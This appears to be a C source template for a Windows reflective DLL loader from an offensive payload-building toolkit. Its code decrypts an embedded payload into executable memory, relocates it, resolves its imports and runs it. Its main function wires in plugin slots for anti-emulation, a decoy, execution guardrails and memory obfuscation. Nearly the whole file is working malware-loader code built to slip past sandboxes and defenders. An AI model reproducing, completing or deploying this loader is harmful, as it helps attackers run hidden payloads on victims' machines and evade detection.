#include <Windows.h>
#include <time.h>


char *supermega_payload;

#define p_RW  0x04
#define p_RX  0x20
#define p_RWX 0x40

/* DLL loader

   This code will load a DLL (not a shellcode!) 
   into new memory region,
   resolve its imports, apply relocations, and execute it.

   Loader is based on: 
     https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
     with some patches to make it work here
*/


typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef BOOL (WINAPI *DLLEntry)(HINSTANCE, DWORD, LPVOID);


void mymemcpy(void* dest, const void* src, size_t n) {
	char* d = (char*)dest;
	const char* s = (const char*)src;
	for (size_t i = 0; i < n; ++i) {
		d[i] = s[i];
	}
}


DWORD_PTR load_dll(LPVOID dllBytes, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
	// get this module's image base address
	PVOID imageBase = GetModuleHandleA(NULL);

	// get pointers to in-memory DLL headers
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

	// allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere
	//LPVOID dllBase = VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// get delta between this module's image base and the DLL that was read into memory
	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

	// copy over DLL image headers to the newly allocated space for the DLL
	mymemcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

	// copy over DLL image sections to the newly allocated space for the DLL
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
		mymemcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
		section++;
	}

	// perform image base relocations
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
	DWORD relocationsProcessed = 0;

	while (relocationsProcessed < relocations.Size)
	{
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

		for (DWORD i = 0; i < relocationsCount; i++)
		{
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

			if (relocationEntries[i].Type == 0)
			{
				continue;
			}

			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			addressToPatch += deltaImageBase;
			mymemcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
		}
	}

	// resolve import address table
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
	LPCSTR libraryName;
	HMODULE library = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
		library = LoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
					thunk->u1.Function = functionAddress;
				}
				++thunk;
			}
		}

		importDescriptor++;
	}

	*ret_dllBase = (DWORD_PTR)dllBase;
	*ret_aoep = ntHeaders->OptionalHeader.AddressOfEntryPoint;

	return 0;
}


{{plugin_antiemulation}}

{{plugin_decoy}}

{{plugin_executionguardrail}}

{{plugin_memoryobfuscation}}

{{plugin_virtualprotect}}

int main()
{
	char* dest = NULL;
	
	// Call: Execution Guardrail
	if (executionguardrail() != 0) {
		return 1;
	}

	// Call: Anti Emulation plugin
	antiemulation();

	// Call: Memory Obfuscation plugin
        memoryobfuscation();

	// Call: Decoy plugin
	decoy();

	dest = VirtualAlloc(0, {{PAYLOAD_LEN}}, 0x3000, PAGE_EXECUTE_READWRITE);

	// FROM supermega_payload[] 
	// TO dest[]
	// Including decryption
{{ plugin_decoder }}

	// Load the DLL at dest
	DWORD_PTR dllBase;
	DWORD aoep;
	load_dll( (void *) dest, &dllBase, &aoep);
	DLLEntry DllEntry = (DLLEntry)(dllBase + aoep);
	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

    return 0;
}

